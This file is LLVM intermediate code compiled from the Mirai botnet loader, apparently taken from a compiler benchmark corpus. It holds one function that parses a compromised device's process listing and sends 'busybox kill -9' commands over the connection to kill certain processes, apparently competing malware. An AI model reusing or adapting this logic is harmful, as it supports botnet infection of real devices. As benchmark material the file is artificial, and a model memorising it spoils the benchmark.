; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_psoutput.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_psoutput.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.connection = type { i8*, i32, i32 }

@TOKEN_RESPONSE = common dso_local global i8* null, align 8
@FALSE = common dso_local global i64 0, align 8
@TRUE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [5 x i8] c"init\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"[init]\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"/bin/busybox kill -9 %d\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @connection_consume_psoutput(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 0
  %18 = load i8*, i8** %17, align 8
  store i8* %18, i8** %5, align 8
  %19 = load %struct.connection*, %struct.connection** %3, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 1
  %24 = load i32, i32* %23, align 8
  %25 = load i8*, i8** @TOKEN_RESPONSE, align 8
  %26 = load i8*, i8** @TOKEN_RESPONSE, align 8
  %27 = call i32 @strlen(i8* %26)
  %28 = call i32 @util_memsearch(i8* %21, i32 %24, i8* %25, i32 %27)
  store i32 %28, i32* %4, align 4
  store i32 0, i32* %6, align 4
  br label %29

29:                                               ; preds = %280, %1
  %30 = load i32, i32* %6, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %37

33:                                               ; preds = %29
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 1
  %36 = load i32, i32* %35, align 8
  br label %39

37:                                               ; preds = %29
  %38 = load i32, i32* %4, align 4
  br label %39

39:                                               ; preds = %37, %33
  %40 = phi i32 [ %36, %33 ], [ %38, %37 ]
  %41 = icmp slt i32 %30, %40
  br i1 %41, label %42, label %283

42:                                               ; preds = %39
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 0
  %45 = load i8*, i8** %44, align 8
  %46 = load i32, i32* %6, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %52, label %59

52:                                               ; preds = %42
  %53 = load %struct.connection*, %struct.connection** %3, align 8
  %54 = getelementptr inbounds %struct.connection, %struct.connection* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  store i8 0, i8* %58, align 1
  br label %279

59:                                               ; preds = %42
  %60 = load %struct.connection*, %struct.connection** %3, align 8
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %60, i32 0, i32 0
  %62 = load i8*, i8** %61, align 8
  %63 = load i32, i32* %6, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = icmp eq i32 %67, 10
  br i1 %68, label %69, label %278

69:                                               ; preds = %59
  store i32 0, i32* %8, align 4
  %70 = load i64, i64* @FALSE, align 8
  store i64 %70, i64* %9, align 8
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  %71 = load %struct.connection*, %struct.connection** %3, align 8
  %72 = getelementptr inbounds %struct.connection, %struct.connection* %71, i32 0, i32 0
  %73 = load i8*, i8** %72, align 8
  %74 = load i32, i32* %6, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  store i8 0, i8* %76, align 1
  store i32 0, i32* %7, align 4
  br label %77

77:                                               ; preds = %158, %69
  %78 = load i32, i32* %7, align 4
  %79 = sext i32 %78 to i64
  %80 = load %struct.connection*, %struct.connection** %3, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 0
  %82 = load i8*, i8** %81, align 8
  %83 = load i32, i32* %6, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i8*, i8** %5, align 8
  %87 = ptrtoint i8* %85 to i64
  %88 = ptrtoint i8* %86 to i64
  %89 = sub i64 %87, %88
  %90 = icmp slt i64 %79, %89
  br i1 %90, label %91, label %161

91:                                               ; preds = %77
  %92 = load i8*, i8** %5, align 8
  %93 = load i32, i32* %7, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %97, 32
  br i1 %98, label %115, label %99

99:                                               ; preds = %91
  %100 = load i8*, i8** %5, align 8
  %101 = load i32, i32* %7, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = sext i8 %104 to i32
  %106 = icmp eq i32 %105, 9
  br i1 %106, label %115, label %107

107:                                              ; preds = %99
  %108 = load i8*, i8** %5, align 8
  %109 = load i32, i32* %7, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8, i8* %108, i64 %110
  %112 = load i8, i8* %111, align 1
  %113 = sext i8 %112 to i32
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %130

115:                                              ; preds = %107, %99, %91
  %116 = load i32, i32* %8, align 4
  %117 = icmp sgt i32 %116, 0
  br i1 %117, label %118, label %124

118:                                              ; preds = %115
  %119 = load i64, i64* %9, align 8
  %120 = icmp ne i64 %119, 0
  br i1 %120, label %124, label %121

121:                                              ; preds = %118
  %122 = load i32, i32* %8, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %8, align 4
  br label %124

124:                                              ; preds = %121, %118, %115
  %125 = load i8*, i8** %5, align 8
  %126 = load i32, i32* %7, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  store i8 0, i8* %128, align 1
  %129 = load i64, i64* @TRUE, align 8
  store i64 %129, i64* %9, align 8
  br label %157

130:                                              ; preds = %107
  %131 = load i32, i32* %8, align 4
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %140

133:                                              ; preds = %130
  %134 = load i8*, i8** %5, align 8
  %135 = load i32, i32* %7, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  store i8* %137, i8** %10, align 8
  %138 = load i32, i32* %8, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %8, align 4
  br label %155

140:                                              ; preds = %130
  %141 = load i32, i32* %8, align 4
  %142 = icmp sge i32 %141, 3
  br i1 %142, label %143, label %154

143:                                              ; preds = %140
  %144 = load i32, i32* %8, align 4
  %145 = icmp sle i32 %144, 5
  br i1 %145, label %146, label %154

146:                                              ; preds = %143
  %147 = load i64, i64* %9, align 8
  %148 = icmp ne i64 %147, 0
  br i1 %148, label %149, label %154

149:                                              ; preds = %146
  %150 = load i8*, i8** %5, align 8
  %151 = load i32, i32* %7, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8, i8* %150, i64 %152
  store i8* %153, i8** %11, align 8
  br label %154

154:                                              ; preds = %149, %146, %143, %140
  br label %155

155:                                              ; preds = %154, %133
  %156 = load i64, i64* @FALSE, align 8
  store i64 %156, i64* %9, align 8
  br label %157

157:                                              ; preds = %155, %124
  br label %158

158:                                              ; preds = %157
  %159 = load i32, i32* %7, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %7, align 4
  br label %77

161:                                              ; preds = %77
  %162 = load i8*, i8** %10, align 8
  %163 = icmp ne i8* %162, null
  br i1 %163, label %164, label %270

164:                                              ; preds = %161
  %165 = load i8*, i8** %11, align 8
  %166 = icmp ne i8* %165, null
  br i1 %166, label %167, label %270

167:                                              ; preds = %164
  %168 = load i8*, i8** %10, align 8
  %169 = call i32 @atoi(i8* %168)
  store i32 %169, i32* %12, align 4
  %170 = load i8*, i8** %11, align 8
  %171 = call i32 @strlen(i8* %170)
  store i32 %171, i32* %13, align 4
  %172 = load i32, i32* %12, align 4
  %173 = icmp ne i32 %172, 1
  br i1 %173, label %174, label %188

174:                                              ; preds = %167
  %175 = load i8*, i8** %11, align 8
  %176 = call i64 @strcmp(i8* %175, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %177 = icmp eq i64 %176, 0
  br i1 %177, label %182, label %178

178:                                              ; preds = %174
  %179 = load i8*, i8** %11, align 8
  %180 = call i64 @strcmp(i8* %179, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %181 = icmp eq i64 %180, 0
  br i1 %181, label %182, label %188

182:                                              ; preds = %178, %174
  %183 = load %struct.connection*, %struct.connection** %3, align 8
  %184 = getelementptr inbounds %struct.connection, %struct.connection* %183, i32 0, i32 2
  %185 = load i32, i32* %184, align 4
  %186 = load i32, i32* %12, align 4
  %187 = call i32 @util_sockprintf(i32 %185, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i32 %186)
  br label %269

188:                                              ; preds = %178, %167
  %189 = load i32, i32* %12, align 4
  %190 = icmp sgt i32 %189, 400
  br i1 %190, label %191, label %268

191:                                              ; preds = %188
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %7, align 4
  br label %192

192:                                              ; preds = %252, %191
  %193 = load i32, i32* %7, align 4
  %194 = load i32, i32* %13, align 4
  %195 = icmp slt i32 %193, %194
  br i1 %195, label %196, label %255

196:                                              ; preds = %192
  %197 = load i8*, i8** %11, align 8
  %198 = load i32, i32* %7, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8, i8* %197, i64 %199
  %201 = load i8, i8* %200, align 1
  %202 = sext i8 %201 to i32
  %203 = icmp sge i32 %202, 48
  br i1 %203, label %204, label %215

204:                                              ; preds = %196
  %205 = load i8*, i8** %11, align 8
  %206 = load i32, i32* %7, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i8, i8* %205, i64 %207
  %209 = load i8, i8* %208, align 1
  %210 = sext i8 %209 to i32
  %211 = icmp sle i32 %210, 57
  br i1 %211, label %212, label %215

212:                                              ; preds = %204
  %213 = load i32, i32* %14, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %14, align 4
  br label %251

215:                                              ; preds = %204, %196
  %216 = load i8*, i8** %11, align 8
  %217 = load i32, i32* %7, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i8, i8* %216, i64 %218
  %220 = load i8, i8* %219, align 1
  %221 = sext i8 %220 to i32
  %222 = icmp sge i32 %221, 97
  br i1 %222, label %223, label %231

223:                                              ; preds = %215
  %224 = load i8*, i8** %11, align 8
  %225 = load i32, i32* %7, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds i8, i8* %224, i64 %226
  %228 = load i8, i8* %227, align 1
  %229 = sext i8 %228 to i32
  %230 = icmp sle i32 %229, 122
  br i1 %230, label %247, label %231

231:                                              ; preds = %223, %215
  %232 = load i8*, i8** %11, align 8
  %233 = load i32, i32* %7, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = load i8, i8* %235, align 1
  %237 = sext i8 %236 to i32
  %238 = icmp sge i32 %237, 65
  br i1 %238, label %239, label %250

239:                                              ; preds = %231
  %240 = load i8*, i8** %11, align 8
  %241 = load i32, i32* %7, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds i8, i8* %240, i64 %242
  %244 = load i8, i8* %243, align 1
  %245 = sext i8 %244 to i32
  %246 = icmp sle i32 %245, 90
  br i1 %246, label %247, label %250

247:                                              ; preds = %239, %223
  %248 = load i32, i32* %15, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %15, align 4
  br label %255

250:                                              ; preds = %239, %231
  br label %251

251:                                              ; preds = %250, %212
  br label %252

252:                                              ; preds = %251
  %253 = load i32, i32* %7, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %7, align 4
  br label %192

255:                                              ; preds = %247, %192
  %256 = load i32, i32* %15, align 4
  %257 = icmp eq i32 %256, 0
  br i1 %257, label %258, label %267

258:                                              ; preds = %255
  %259 = load i32, i32* %14, align 4
  %260 = icmp sgt i32 %259, 0
  br i1 %260, label %261, label %267

261:                                              ; preds = %258
  %262 = load %struct.connection*, %struct.connection** %3, align 8
  %263 = getelementptr inbounds %struct.connection, %struct.connection* %262, i32 0, i32 2
  %264 = load i32, i32* %263, align 4
  %265 = load i32, i32* %12, align 4
  %266 = call i32 @util_sockprintf(i32 %264, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i32 %265)
  br label %267

267:                                              ; preds = %261, %258, %255
  br label %268

268:                                              ; preds = %267, %188
  br label %269

269:                                              ; preds = %268, %182
  br label %270

270:                                              ; preds = %269, %164, %161
  %271 = load %struct.connection*, %struct.connection** %3, align 8
  %272 = getelementptr inbounds %struct.connection, %struct.connection* %271, i32 0, i32 0
  %273 = load i8*, i8** %272, align 8
  %274 = load i32, i32* %6, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds i8, i8* %273, i64 %275
  %277 = getelementptr inbounds i8, i8* %276, i64 1
  store i8* %277, i8** %5, align 8
  br label %278

278:                                              ; preds = %270, %59
  br label %279

279:                                              ; preds = %278, %52
  br label %280

280:                                              ; preds = %279
  %281 = load i32, i32* %6, align 4
  %282 = add nsw i32 %281, 1
  store i32 %282, i32* %6, align 4
  br label %29

283:                                              ; preds = %39
  %284 = load i32, i32* %4, align 4
  %285 = icmp eq i32 %284, -1
  br i1 %285, label %286, label %309

286:                                              ; preds = %283
  %287 = load %struct.connection*, %struct.connection** %3, align 8
  %288 = getelementptr inbounds %struct.connection, %struct.connection* %287, i32 0, i32 1
  %289 = load i32, i32* %288, align 8
  %290 = icmp sgt i32 %289, 7168
  br i1 %290, label %291, label %308

291:                                              ; preds = %286
  %292 = load %struct.connection*, %struct.connection** %3, align 8
  %293 = getelementptr inbounds %struct.connection, %struct.connection* %292, i32 0, i32 0
  %294 = load i8*, i8** %293, align 8
  %295 = load %struct.connection*, %struct.connection** %3, align 8
  %296 = getelementptr inbounds %struct.connection, %struct.connection* %295, i32 0, i32 0
  %297 = load i8*, i8** %296, align 8
  %298 = getelementptr inbounds i8, i8* %297, i64 6144
  %299 = load %struct.connection*, %struct.connection** %3, align 8
  %300 = getelementptr inbounds %struct.connection, %struct.connection* %299, i32 0, i32 1
  %301 = load i32, i32* %300, align 8
  %302 = sub nsw i32 %301, 6144
  %303 = call i32 @memmove(i8* %294, i8* %298, i32 %302)
  %304 = load %struct.connection*, %struct.connection** %3, align 8
  %305 = getelementptr inbounds %struct.connection, %struct.connection* %304, i32 0, i32 1
  %306 = load i32, i32* %305, align 8
  %307 = sub nsw i32 %306, 6144
  store i32 %307, i32* %305, align 8
  br label %308

308:                                              ; preds = %291, %286
  store i32 0, i32* %2, align 4
  br label %339

309:                                              ; preds = %283
  store i32 0, i32* %6, align 4
  br label %310

310:                                              ; preds = %334, %309
  %311 = load i32, i32* %6, align 4
  %312 = load %struct.connection*, %struct.connection** %3, align 8
  %313 = getelementptr inbounds %struct.connection, %struct.connection* %312, i32 0, i32 1
  %314 = load i32, i32* %313, align 8
  %315 = icmp slt i32 %311, %314
  br i1 %315, label %316, label %337

316:                                              ; preds = %310
  %317 = load %struct.connection*, %struct.connection** %3, align 8
  %318 = getelementptr inbounds %struct.connection, %struct.connection* %317, i32 0, i32 0
  %319 = load i8*, i8** %318, align 8
  %320 = load i32, i32* %6, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds i8, i8* %319, i64 %321
  %323 = load i8, i8* %322, align 1
  %324 = sext i8 %323 to i32
  %325 = icmp eq i32 %324, 0
  br i1 %325, label %326, label %333

326:                                              ; preds = %316
  %327 = load %struct.connection*, %struct.connection** %3, align 8
  %328 = getelementptr inbounds %struct.connection, %struct.connection* %327, i32 0, i32 0
  %329 = load i8*, i8** %328, align 8
  %330 = load i32, i32* %6, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8, i8* %329, i64 %331
  store i8 32, i8* %332, align 1
  br label %333

333:                                              ; preds = %326, %316
  br label %334

334:                                              ; preds = %333
  %335 = load i32, i32* %6, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %6, align 4
  br label %310

337:                                              ; preds = %310
  %338 = load i32, i32* %4, align 4
  store i32 %338, i32* %2, align 4
  br label %339

339:                                              ; preds = %337, %308
  %340 = load i32, i32* %2, align 4
  ret i32 %340
}

declare dso_local i32 @util_memsearch(i8*, i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @util_sockprintf(i32, i8*, i32) #1

declare dso_local i32 @memmove(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
